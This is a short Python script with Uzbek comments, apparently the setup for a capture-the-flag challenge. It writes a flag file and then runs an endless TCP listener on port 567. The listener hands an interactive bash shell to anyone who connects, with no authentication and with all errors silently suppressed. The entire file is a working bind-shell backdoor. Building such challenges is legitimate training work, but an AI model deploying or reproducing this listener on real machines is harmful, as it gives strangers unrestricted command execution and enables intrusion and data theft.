import socket
import subprocess
import os

flag_content = "SOCAT{Mana_sizga!}"
flag_path = "SOCAT-Flag2.txt"

# Flag faylini yaratish
if not os.path.exists(flag_path):
    with open(flag_path, "w") as f:
        f.write(flag_content)

# Doimiy server
while True:
    try:
        # Soketni sozlash
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', 567))
        s.listen(5)

        # Ulanishni qabul qilish
        conn, addr = s.accept()

        pid = os.fork()
        if pid == 0:  # Bola jarayoni
            s.close()  # Bola jarayonida asl soketni yopamiz
            os.dup2(conn.fileno(), 0)
            os.dup2(conn.fileno(), 1)
            os.dup2(conn.fileno(), 2)
            subprocess.call(["/bin/bash", "-i"])
            conn.close()
            os._exit(0)  # Bola jarayonini yakunlash
        else:
            conn.close()  # Ota jarayonida ulanishni yopish
    except:
        pass  # Hech qanday xato xabarlarini ko'rsatmaslik
    finally:
        try:
            s.close()
        except:
            pass

